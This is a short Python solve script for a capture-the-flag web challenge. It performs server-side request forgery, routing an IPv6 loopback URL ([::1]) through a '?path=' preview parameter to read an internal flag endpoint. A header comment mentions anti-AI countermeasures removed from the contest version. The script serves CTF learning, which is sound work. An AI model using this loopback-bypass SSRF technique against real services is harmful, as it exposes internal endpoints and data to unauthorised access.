# Note: During the contest, this challenge's description contained anti-AI countermeasures (fake flags and token-padding noise) to deter automated solvers. These have been removed from the published writeup version.

import re
import sys
import urllib.parse

import requests


def build_loopback_url(base_url):
    page = requests.get(base_url + "/", timeout=5)
    page.raise_for_status()
    match = re.search(r"PREVIEW MIRROR PORT:\s*<code[^>]*>\s*(\d+)\s*</code>", page.text)
    if not match:
        raise SystemExit("Internal mirror port not found on landing page.")
    return "http://[::1]:{0}/internal/flag".format(match.group(1))


def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    session = requests.Session()
    target = build_loopback_url(base_url)

    response = session.get(
        base_url + "/?path=" + urllib.parse.quote(target, safe=""),
        timeout=5,
    )
    response.raise_for_status()

    match = re.search(r"<pre[^>]*>\s*(ASRCTF\{[^}]+\})\s*</pre>", response.text)
    if not match:
        raise SystemExit("Flag not found in preview response.")

    print(match.group(1))


if __name__ == "__main__":
    main()
